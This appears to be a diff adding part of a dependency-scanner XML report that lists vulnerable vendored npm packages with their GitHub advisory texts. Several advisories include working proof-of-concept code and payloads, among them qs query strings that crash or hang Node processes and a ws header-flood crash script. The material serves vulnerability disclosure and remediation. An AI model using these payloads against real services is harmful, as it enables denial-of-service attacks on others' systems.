+                <failure message="cvssV3: MEDIUM, score: 5.300000190734863 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)"/>
+            <system-out>### Impact
+
+Morgan&apos;s `:remote-user` token extracts the Basic auth username from the `Authorization` header and writes it to the log stream without neutralizing control characters. An attacker can send a crafted `Authorization: Basic` header containing CR/LF characters to inject forged log lines, corrupting the one-request-per-line structure of access logs.
+
+The built-in `combined`, `common`, `default`, and `short` formats are affected, as well as any custom format that includes `:remote-user`.
+
+### Patches
+
+Users should upgrade to version 1.11.0.
+
+### Workarounds
+
+Use a custom format string that does not include `:remote-user`.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?morgan, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-9f6g-j8ch-79g4" name="pkg:npm/morgan@1.9.1">
+                <failure message="cvssV3: MEDIUM, score: 5.300000190734863 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)"/>
+            <system-out>### Impact
+
+Morgan writes attacker-controlled request data to the access log. Its escaping (added in 1.11.0 and 1.12.0) neutralizes control characters, the Unicode line separators, and backslash, but not the double quote (`0x22`), which is the field delimiter of the Apache combined log format morgan emits. An attacker who controls a quoted field (`:user-agent`, `:referrer`, the request URL, or the Basic auth `:remote-user`) can inject a double quote to close the field early and forge additional fields in the log record. The `combined`, `common`, and `default` formats, and any custom format that quotes a token, are affected. This is an incomplete fix of CVE-2026-5078 and CVE-2026-15603.
+
+### Patches
+
+Users should upgrade to version 1.12.1.
+
+### Workarounds
+
+Update to version 1.12.1.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?morgan, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-jxfw-x594-9x9m" name="pkg:npm/morgan@1.9.1">
+                <failure message="cvssV3: MEDIUM, score: 5.300000190734863 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)"/>
+            <system-out>### Impact
+
+Morgan writes attacker-controlled request data to the access log through its tokens. The 1.11.0 fix neutralizes C0 control characters, DEL, and backslash, but it does not escape the Unicode line separators `U+0085` (NEL), `U+2028` (LINE SEPARATOR), or `U+2029` (PARAGRAPH SEPARATOR). These code points are reachable through several tokens, including the request URL (`:url`), request headers such as `:user-agent` and `:referrer`, arbitrary `:req[header]` values, and the Basic auth username (`:remote-user`). NEL is valid `obs-text` in HTTP header values, so an attacker can place it in an ordinary request header.
+
+When such a value is logged, the raw code points survive into the emitted access-log record, and downstream ECMAScript-aware or Unicode-aware log processing splits the single physical record into multiple logical records. This allows an attacker to forge log entries. The built-in `combined`, `common`, `default`, and `short` formats are affected, as well as any custom format. This is an incomplete fix of CVE-2026-5078.
+
+### Patches
+
+Users should upgrade to version 1.12.0.
+
+### Workarounds
+
+None. The affected values include the request URL and request headers, which are core to access logging, so there is no practical format-based mitigation. Upgrade to 1.12.0.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?morgan, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="1" errors="0" time="0" id="40" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?on-headers" package="on-headers:1.0.2" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-76c9-3jph-rj3q" name="pkg:npm/on-headers@1.0.2">
+                <failure message="cvssV3: LOW, score: 3.4000000953674316 (CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:N)"/>
+            <system-out>### Impact
+
+A bug in on-headers versions `&lt; 1.1.0` may result in response headers being inadvertently modified when an array is passed to `response.writeHead()`
+
+### Patches
+
+Users should upgrade to `1.1.0`
+
+### Workarounds
+
+Uses are encouraged to upgrade to `1.1.0`, but this issue can be worked around by passing an object to `response.writeHead()` rather than an array.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?on-headers, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="41" name="/src/src/main/resources/static/vendors/jquery-mask/package.js" package="package.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="package.js"/>
+    </testsuite>
+        <testsuite failures="3" errors="0" time="0" id="42" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?qs" package="qs:6.5.2" skipped="0" tests="3" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-hrpp-h998-j3pp" name="pkg:npm/qs@6.5.2">
+                <failure message="cvssV3: HIGH, score: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)"/>
+            <system-out>qs before 6.10.3 allows attackers to cause a Node process hang because an `__ proto__` key can be used. In many typical web framework use cases, an unauthenticated remote attacker can place the attack payload in the query string of the URL that is used to visit the application, such as `a[__proto__]=b&amp;a[__proto__]&amp;a[length]=100000000`. The fix was backported to qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3, and 6.2.4.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?qs, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-4mjr-xmp4-gh2g" name="pkg:npm/qs@6.5.2">
+                <failure message="cvssV3: MEDIUM, score: 5.300000190734863 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)"/>
+            <system-out>### Summary
+
+`qs.stringify()` calls `utils.isBuffer()` on every value it serializes, and `utils.isBuffer()` invokes `obj.constructor.isBuffer(obj)` without checking that it is callable. A value whose own `constructor.isBuffer` is a non-function makes `qs` call a non-callable and throw `TypeError`. Such a value is produced **by `qs.parse` itself** from an untrusted query string when `plainObjects: true` or `allowPrototypes: true` is set, so a pure-`qs` `parse` → `stringify` round-trip — no `JSON.parse` — turns an unauthenticated query string into an uncaught throw.
+
+An attacker-controlled `parse` input reaches the host application&apos;s availability asset — via `qs`&apos;s own recommended `plainObjects` mitigation — and triggers an uncaught exception during a `parse` → `stringify` round-trip.
+
+### Details
+`utils.isBuffer` runs at `lib/stringify.js:127` for every serialized value:
+
+```js
+if (isNonNullishPrimitive(obj) || utils.isBuffer(obj)) { ... }
+```
+
+`utils.isBuffer` (`lib/utils.js:327-333`) invokes `obj.constructor.isBuffer` without verifying it is callable:
+
+```js
+var isBuffer = function isBuffer(obj) {
+    if (!obj || typeof obj !== &apos;object&apos;) { return false; }
+    return !!(obj.constructor &amp;&amp; obj.constructor.isBuffer &amp;&amp; obj.constructor.isBuffer(obj));
+};
+```
+
+`constructor` and `isBuffer` are ordinary keys. `qs.parse` with `plainObjects: true` or `allowPrototypes: true` keeps them as own properties, so the parsed value carries a non-function `constructor.isBuffer`; `stringify` then calls a non-callable and throws `TypeError`. By contrast `utils.isRegExp` uses a brand check (`Object.prototype.toString`); the missing guard here is an internal inconsistency, not a platform limitation.
+
+
+### Trust Boundary Note
+
+`qs.stringify` alone treats its input as caller-constructed, so serializing a hostile object could be argued outside its contract. This report does not depend on that framing: the malicious shape is produced by **`qs.parse`, whose input is untrusted by design**. `qs.parse` normally strips a `constructor` key via its prototype guard, but with the documented options `plainObjects: true` or `allowPrototypes: true` the key survives and lands as an own property. Feeding the parsed object back into `qs.stringify` — the standard round-trip in gateways and request-forwarders — then hits the unchecked call. 
+
+
+### PoC
+`poc02c_isBuffer_qs_only_roundtrip.js` — pure-`qs` chain, no `JSON.parse`; an untrusted query string alone reaches the throw:
+
+```js
+&apos;use strict&apos;;
+var qs = require(&apos;qs&apos;);
+
+var untrustedQueryString = &apos;x%5Bconstructor%5D%5BisBuffer%5D=y&apos;; // x[constructor][isBuffer]=y
+
+var parsed = qs.parse(untrustedQueryString, { plainObjects: true });
+console.log(&apos;[parse] kept constructor key:&apos;, JSON.stringify(parsed));
+
+try {
+    qs.stringify(parsed);
+    console.log(&apos;[stringify] no throw (unexpected)&apos;);
+} catch (e) {
+    console.log(&apos;[stringify] DoS reproduced -&gt;&apos;, e.constructor.name + &apos;:&apos;, e.message);
+}
+```
+
+`poc02_isBuffer.js` — the minimal defect:
+
+```js
+&apos;use strict&apos;;
+var qs = require(&apos;qs&apos;);
+try {
+    qs.stringify(JSON.parse(&apos;{&quot;a&quot;:{&quot;constructor&quot;:{&quot;isBuffer&quot;:&quot;x&quot;}}}&apos;));
+} catch (e) {
+    console.log(&apos;[A] DoS reproduced -&gt;&apos;, e.constructor.name + &apos;:&apos;, e.message);
+}
+```
+
+`poc02b_isBuffer_async_crash.js` — worker death in an async sink:
+
+```js
+&apos;use strict&apos;;
+var qs = require(&apos;qs&apos;);
+
+function handleRequestAsync(clientJsonBody) {
+    try {
+        setImmediate(function () {                 // async continuation, outside the try
+            qs.stringify(JSON.parse(clientJsonBody)); // throws here, uncaught
+        });
+        console.log(&apos;[handler] returned 200 synchronously; async work scheduled&apos;);
+    } catch (e) {
+        console.log(&apos;[handler] caught synchronously (will NOT happen):&apos;, e.message);
+    }
+}
+process.on(&apos;exit&apos;, function (code) {
+    console.log(&apos;[proc] process exiting with code:&apos;, code);
+});
+handleRequestAsync(&apos;{&quot;filters&quot;:{&quot;constructor&quot;:{&quot;isBuffer&quot;:&quot;x&quot;}}}&apos;);
+```
+
+### Execution Steps
+
+```bash
+cd poc
+npm install qs@6.15.3
+node poc02c_isBuffer_qs_only_roundtrip.js  # pure qs parse-&gt;stringify -&gt; TypeError
+node poc02_isBuffer.js                      # minimal defect -&gt; TypeError inside stringify
+node poc02b_isBuffer_async_crash.js         # async sink -&gt; uncaught throw -&gt; exit code 1
+```
+
+### Reproduction Evidence
+
+`poc02c_isBuffer_qs_only_roundtrip.js` :
+
+```
+[parse] kept constructor key: {&quot;x&quot;:{&quot;constructor&quot;:{&quot;isBuffer&quot;:&quot;y&quot;}}}
+[stringify] DoS reproduced -&gt; TypeError: obj.constructor.isBuffer is not a function
+```
+
+`poc02_isBuffer.js`:
+
+```
+[A] DoS reproduced -&gt; TypeError: obj.constructor.isBuffer is not a function
+```
+
+`poc02b_isBuffer_async_crash.js` :
+
+```
+[handler] returned 200 synchronously; async work scheduled
+[proc] process exiting with code: 1
+TypeError: obj.constructor.isBuffer is not a function
+    at Object.isBuffer (.../qs/lib/utils.js:332:78)
+    at stringify (.../qs/lib/stringify.js:127:45)
+=== EXIT CODE: 1 ===
+```
+
+The pure-`qs` round-trip shows the malicious shape originates from `qs.parse` of an untrusted query string, with no `JSON.parse`. The synchronous `try/catch` in the async case does not catch the throw; the process exits with code 1, denying service to all requests on that worker.
+
+### Impact
+
+An unauthenticated request degrades any endpoint that re-serializes deserialized client data with `qs.stringify`. The primary impact is a per-request failure: the handler throws and the framework returns HTTP 500. Where the call sits in an unguarded async continuation, the throw escapes and the worker process exits, denying service to all requests it was handling, which means a higher impact that depends on the application&apos;s error handling, not on `qs`.
+
+### Recommended Fix
+
+Replace the duck-type with a brand check mirroring `utils.isRegExp`:
+
+```js
+var isBuffer = function isBuffer(obj) {
+    if (!obj || typeof obj !== &apos;object&apos;) { return false; }
+    if (typeof Buffer !== &apos;undefined&apos; &amp;&amp; typeof Buffer.isBuffer === &apos;function&apos;) {
+        return Buffer.isBuffer(obj);
+    }
+    return Object.prototype.toString.call(obj) === &apos;[object Uint8Array]&apos;;
+};
+```
+
+If duck-typing must remain, require `typeof obj.constructor.isBuffer === &apos;function&apos;` before invoking and wrap the call in `try/catch`.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?qs, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-6rw7-vpxm-498p" name="pkg:npm/qs@6.5.2">
+                <failure message="cvssV3: LOW, score: 3.700000047683716 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L)"/>
+            <system-out>### Summary
+
+The `arrayLimit` option in qs did not enforce limits for bracket notation (`a[]=1&amp;a[]=2`), only for indexed notation (`a[0]=1`). This is a consistency bug; `arrayLimit` should apply uniformly across all array notations.
+
+**Note:** The default `parameterLimit` of 1000 effectively mitigates the DoS scenario originally described. With default options, bracket notation cannot produce arrays larger than `parameterLimit` regardless of `arrayLimit`, because each `a[]=value` consumes one parameter slot. The severity has been reduced accordingly.
+
+### Details
+
+The `arrayLimit` option only checked limits for indexed notation (`a[0]=1&amp;a[1]=2`) but did not enforce it for bracket notation (`a[]=1&amp;a[]=2`).
+
+**Vulnerable code** (`lib/parse.js:159-162`):
+```javascript
+if (root === &apos;[]&apos; &amp;&amp; options.parseArrays) {
+    obj = utils.combine([], leaf);  // No arrayLimit check
+}
+```
+
+**Working code** (`lib/parse.js:175`):
+```javascript
+else if (index &lt;= options.arrayLimit) {  // Limit checked here
+    obj = [];
+    obj[index] = leaf;
+}
+```
+
+The bracket notation handler at line 159 uses `utils.combine([], leaf)` without validating against `options.arrayLimit`, while indexed notation at line 175 checks `index &lt;= options.arrayLimit` before creating arrays.
+
+### PoC
+
+```javascript
+const qs = require(&apos;qs&apos;);
+const result = qs.parse(&apos;a[]=1&amp;a[]=2&amp;a[]=3&amp;a[]=4&amp;a[]=5&amp;a[]=6&apos;, { arrayLimit: 5 });
+console.log(result.a.length);  // Output: 6 (should be max 5)
+```
+
+**Note on parameterLimit interaction:** The original advisory&apos;s &quot;DoS demonstration&quot; claimed a length of 10,000, but `parameterLimit` (default: 1000) caps parsing to 1,000 parameters. With default options, the actual output is 1,000, not 10,000.
+
+### Impact
+
+Consistency bug in `arrayLimit` enforcement. With default `parameterLimit`, the practical DoS risk is negligible since `parameterLimit` already caps the total number of parsed parameters (and thus array elements from bracket notation). The risk increases only when `parameterLimit` is explicitly set to a very high value.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?qs, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="43" name="/src/src/main/resources/static/vendors/jquery-mask/test/qunit.js" package="qunit.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="qunit.js"/>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="44" name="/src/src/main/resources/static/vendors/fontawesome/js/regular.js" package="regular.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="regular.js"/>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="45" name="/src/src/main/resources/static/vendors/fontawesome/js/regular.min.js" package="regular.min.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="regular.min.js"/>
+    </testsuite>
+        <testsuite failures="1" errors="0" time="0" id="46" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?request" package="request:2.88.0" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-p8p7-x288-28g6" name="pkg:npm/request@2.88.0">
+                <failure message="cvssV3: MEDIUM, score: 6.099999904632568 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)"/>
+            <system-out>The `request` package through 2.88.2 for Node.js and the `@cypress/request` package prior to 3.0.0 allow a bypass of SSRF mitigations via an attacker-controller server that does a cross-protocol redirect (HTTP to HTTPS, or HTTPS to HTTP).
+
+NOTE: The `request` package is no longer supported by the maintainer.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?request, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="1" errors="0" time="0" id="47" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?semver" package="semver:5.4.1" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-c2qf-rxjj-qqgw" name="pkg:npm/semver@5.4.1">
+                <failure message="cvssV3: HIGH, score: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)"/>
+            <system-out>Versions of the package semver before 7.5.2 on the 7.x branch, before 6.3.1 on the 6.x branch, and all other versions before 5.7.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?semver, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="1" errors="0" time="0" id="48" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?send" package="send:0.16.1" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-m6fv-jmcg-4jfg" name="pkg:npm/send@0.16.1">
+                <failure message="cvssV3: MEDIUM, score: 5.0 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L)"/>
+            <system-out>### Impact
+
+passing untrusted user input - even after sanitizing it - to `SendStream.redirect()` may execute untrusted code
+
+### Patches
+
+this issue is patched in send 0.19.0
+
+### Workarounds
+
+users are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist
+
+### Details
+
+successful exploitation of this vector requires the following:
+
+1. The attacker MUST control the input to response.redirect()
+1. express MUST NOT redirect before the template appears
+1. the browser MUST NOT complete redirection before:
+1. the user MUST click on the link in the template</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?send, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="1" errors="0" time="0" id="49" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?serve-static" package="serve-static:1.13.1" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-cm22-4g7w-348p" name="pkg:npm/serve-static@1.13.1">
+                <failure message="cvssV3: MEDIUM, score: 5.0 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L)"/>
+            <system-out>### Impact
+
+passing untrusted user input - even after sanitizing it - to `redirect()` may execute untrusted code
+
+### Patches
+
+this issue is patched in serve-static 1.16.0
+
+### Workarounds
+
+users are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist
+
+### Details
+
+successful exploitation of this vector requires the following:
+
+1. The attacker MUST control the input to response.redirect()
+1. express MUST NOT redirect before the template appears
+1. the browser MUST NOT complete redirection before:
+1. the user MUST click on the link in the template
+</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?serve-static, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="2" errors="0" time="0" id="50" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?shelljs" package="shelljs:0.3.0" skipped="0" tests="2" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-4rq4-32rv-6wp6" name="pkg:npm/shelljs@0.3.0">
+                <failure message="cvssV3: HIGH, score: 7.099999904632568 (CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:H)"/>
+            <system-out>shelljs is vulnerable to Improper Privilege Management</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?shelljs, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-64g7-mvw6-v9qj" name="pkg:npm/shelljs@0.3.0">
+                <failure message="unscored severity: moderate"/>
+            <system-out>### Impact
+Output from the synchronous version of `shell.exec()` may be visible to other users on the same system. You may be affected if you execute `shell.exec()` in multi-user Mac, Linux, or WSL environments, or if you execute `shell.exec()` as the root user.
+
+Other shelljs functions (including the asynchronous version of `shell.exec()`) are not impacted.
+
+### Patches
+Patched in shelljs 0.8.5
+
+### Workarounds
+Recommended action is to upgrade to 0.8.5.
+
+### References
+https://huntr.dev/bounties/50996581-c08e-4eed-a90e-c0bac082679c/
+
+### For more information
+If you have any questions or comments about this advisory:
+* Ask at https://github.com/shelljs/shelljs/issues/1058
+* Open an issue at https://github.com/shelljs/shelljs/issues/new
+</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?shelljs, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="51" name="/src/src/main/resources/static/vendors/jquery-mask/test/sinon-1.10.3.js" package="sinon-1.10.3.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="sinon-1.10.3.js"/>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="52" name="/src/src/main/resources/static/vendors/jquery-mask/test/sinon-qunit-1.0.0.js" package="sinon-qunit-1.0.0.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="sinon-qunit-1.0.0.js"/>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="53" name="/src/src/main/resources/static/vendors/fontawesome/js/solid.js" package="solid.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="solid.js"/>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="54" name="/src/src/main/resources/static/vendors/fontawesome/js/solid.min.js" package="solid.min.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="solid.min.js"/>
+    </testsuite>
+        <testsuite failures="1" errors="0" time="0" id="55" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?tough-cookie" package="tough-cookie:2.4.3" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-72xf-g2v4-qvf3" name="pkg:npm/tough-cookie@2.4.3">
+                <failure message="cvssV3: MEDIUM, score: 6.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)"/>
+            <system-out>Versions of the package tough-cookie before 4.1.3 are vulnerable to Prototype Pollution due to improper handling of Cookies when using CookieJar in `rejectPublicSuffixes=false` mode. This issue arises from the manner in which the objects are initialized.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?tough-cookie, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="1" errors="0" time="0" id="56" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?trim-newlines" package="trim-newlines:1.0.0" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-7p7h-4mm5-852v" name="pkg:npm/trim-newlines@1.0.0">
+                <failure message="cvssV3: HIGH, score: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)"/>
+            <system-out>@rkesters/gnuplot is an easy to use node module to draw charts using gnuplot and ps2pdf. The trim-newlines package before 3.0.1 and 4.x before 4.0.1 for Node.js has an issue related to regular expression denial-of-service (ReDoS) for the `.end()` method.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?trim-newlines, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="1" errors="0" time="0" id="57" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?uuid" package="uuid:3.3.2" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-w5hq-g745-h8pq" name="pkg:npm/uuid@3.3.2">
+                <failure message="cvssV3: HIGH, score: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)"/>
+            <system-out>### Summary
+
+The `v3()`, `v5()`, and `v6()` [API methods](https://github.com/uuidjs/uuid#api-summary) (not `uuid` release versions) accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  
+By contrast, `v4()`, `v1()`, and `v7()` API methods explicitly throw `RangeError` on invalid bounds.
+
+This inconsistency allows **silent partial writes** into caller-provided buffers.
+
+
+### Affected code
+
+- `src/v35.ts` (`v3()`/`v5()` path) writes `buf[offset + i]` without bounds validation.
+- `src/v6.ts` writes `buf[offset + i]` without bounds validation.
+
+### Reproducible PoC
+
+```bash
+cd /home/StrawHat/uuid
+npm ci
+npm run build
+
+node --input-type=module -e &quot;
+import {v4,v5,v6} from &apos;./dist-node/index.js&apos;;
+const ns=&apos;6ba7b810-9dad-11d1-80b4-00c04fd430c8&apos;;
+for (const [name,fn] of [
+  [&apos;v4()&apos;,()=&gt;v4({},new Uint8Array(8),4)],
+  [&apos;v5()&apos;,()=&gt;v5(&apos;x&apos;,ns,new Uint8Array(8),4)],
+  [&apos;v6()&apos;,()=&gt;v6({},new Uint8Array(8),4)],
+]) {
+  try { fn(); console.log(name,&apos;NO_THROW&apos;); }
+  catch(e){ console.log(name,&apos;THREW&apos;,e.name); }
+}&quot;
+```
+
+Observed:
+
+- `v4() THREW RangeError`
+- `v5() NO_THROW`
+- `v6() NO_THROW`
+
+Example partial overwrite evidence captured during audit:
+
+```text
+same true buf [
+  170, 170, 170, 170,
+   75, 224, 100,  63
+]
+v6 [
+  187, 187, 187, 187,
+   31,  19, 185,  64
+]
+```
+
+### Security impact
+
+- **Primary**: integrity/robustness issue (silent partial output).
+- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.
+- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.
+
+### Suggested fix
+
+Add the same guard used by `v4()`/`v1()`/`v7()`:
+
+```ts
+if (offset &lt; 0 || offset + 16 &gt; buf.length) {
+  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);
+}
+```
+
+Apply to:
+
+- `src/v35.ts` (covers `v3()` and `v5()`)
+- `src/v6.ts`</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?uuid, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="58" name="/src/src/main/resources/static/vendors/fontawesome/js/v4-shims.js" package="v4-shims.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="v4-shims.js"/>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="59" name="/src/src/main/resources/static/vendors/fontawesome/js/v4-shims.min.js" package="v4-shims.min.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="v4-shims.min.js"/>
+    </testsuite>
+        <testsuite failures="3" errors="0" time="0" id="60" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?ws" package="ws:6.2.1" skipped="0" tests="3" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-3h5v-q93c-6h6q" name="pkg:npm/ws@6.2.1">
+                <failure message="cvssV3: HIGH, score: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)"/>
+            <system-out>### Impact
+
+A request with a number of headers exceeding the [`server.maxHeadersCount`][] threshold could be used to crash a ws server.
+
+### Proof of concept
+
+```js
+const http = require(&apos;http&apos;);
+const WebSocket = require(&apos;ws&apos;);
+
+const wss = new WebSocket.Server({ port: 0 }, function () {
+  const chars = &quot;!#$%&amp;&apos;*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~&quot;.split(&apos;&apos;);
+  const headers = {};
+  let count = 0;
+
+  for (let i = 0; i &lt; chars.length; i++) {
+    if (count === 2000) break;
+
+    for (let j = 0; j &lt; chars.length; j++) {
+      const key = chars[i] + chars[j];
+      headers[key] = &apos;x&apos;;
+
+      if (++count === 2000) break;
+    }
+  }
+
+  headers.Connection = &apos;Upgrade&apos;;
+  headers.Upgrade = &apos;websocket&apos;;
+  headers[&apos;Sec-WebSocket-Key&apos;] = &apos;dGhlIHNhbXBsZSBub25jZQ==&apos;;
+  headers[&apos;Sec-WebSocket-Version&apos;] = &apos;13&apos;;
+
+  const request = http.request({
+    headers: headers,
+    host: &apos;127.0.0.1&apos;,
+    port: wss.address().port
+  });
+
+  request.end();
+});
+```
+
+### Patches
+
+The vulnerability was fixed in ws@8.17.1 (https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c) and backported to ws@7.5.10 (https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f), ws@6.2.3 (https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63), and ws@5.2.4 (https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e).
+
+### Workarounds
+
+In vulnerable versions of ws, the issue can be mitigated in the following ways:
+
+1. Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options so that no more headers than the `server.maxHeadersCount` limit can be sent.
+2. Set `server.maxHeadersCount` to `0` so that no limit is applied.
+
+### Credits
+
+The vulnerability was reported by [Ryan LaPointe](https://github.com/rrlapointe) in https://github.com/websockets/ws/issues/2230.
+
+### References
+
+- https://github.com/advisories/GHSA-3h5v-q93c-6h6q
+- https://www.cve.org/CVERecord?id=CVE-2024-37890
+- https://github.com/websockets/ws/issues/2230
+- https://github.com/websockets/ws/pull/2231
+
+[`--max-http-header-size=size`]: https://nodejs.org/api/cli.html#--max-http-header-sizesize
